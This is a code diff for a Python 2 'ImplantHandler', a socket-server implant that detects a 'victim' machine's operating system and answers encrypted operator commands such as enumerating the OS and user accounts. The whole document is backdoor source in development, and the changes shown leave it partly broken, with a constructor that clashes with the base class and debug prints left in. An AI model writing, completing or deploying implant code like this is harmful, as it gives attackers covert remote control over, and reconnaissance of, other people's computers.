@@ -5,23 +5,29 @@ import sys
 
 from os_types.macintosh import Mac
 from os_types.windows import Windows
-from encoders.mime import Mime
     
 class ImplantHandler(SocketServer.BaseRequestHandler):
+    def __init__(self, ip, port, cipher):
+        self.ip = ip
+        self.port = port
+        self.cipher = cipher
+        #self.logger = logging.getLogger('ImplantHandler')
+        
     def handle(self):
         from .constants import BUFFER_SIZE
-        
+        print "here1"
         if platform.system() == 'Darwin':
             victim = Mac()
-        elif platform.system() == 'Windows':
+        elif platform.system() == 'Windows': #if sys.platform.lower().startswith("win"):
             victim = Windows()
         else:
             self.request.sendall("Unknown OS: " + platform.system + ". Please proceed with caution.")
 
         while True:
+            print "here2"
             try:
                 cmd = self.cipher.decode(self.request.recv(BUFFER_SIZE)).strip()
-                
+
                 if cmd == "enum_os":
                     self.request.sendall(self.cipher.encode(victim.enum_os()))
                 elif cmd == "enum_users":
@@ -40,27 +46,18 @@ class ImplantHandler(SocketServer.BaseRequestHandler):
                 print 'Uh no!', e
                 self.server.close_request(self.request)
                 sys.exit(1)                          
-        
-# if __name__ == "__main__":
-#     implant = ImplantHandler()
-#     implant.run("localhost", 8080, Mime())
 
-def run(ip, port, cipher):
-    server = None
-    try:
-        SocketServer.TCPServer.allow_reuse_address = True
-        server = SocketServer.TCPServer((ip, port), ImplantHandler)
-        print "[+] Implant active...Terminate w/ Ctrl-C\n"
-        server.serve_forever()
-    except KeyboardInterrupt:
-        server.shutdown()
-    except Exception as e:
-        print "[!] Couldn't start server {0}".format(e)
-    finally:
-        if server == None:
-            print "[!] Could not bind to socket"
-        else:
-            print "[+] Shutting down server."
+    def run(self):
+        try:
+            SocketServer.TCPServer.allow_reuse_address = True
+            server = SocketServer.TCPServer((self.ip, self.port), ImplantHandler)
+            print "[+] Implant active...Terminate w/ Ctrl-C\n"
+            server.serve_forever()
+        except KeyboardInterrupt:
+            server.shutdown()
+        except Exception as e:
+            print "[!] Implant run() --> {0}".format(e)
+        finally:
             server.shutdown()
 
 # import os
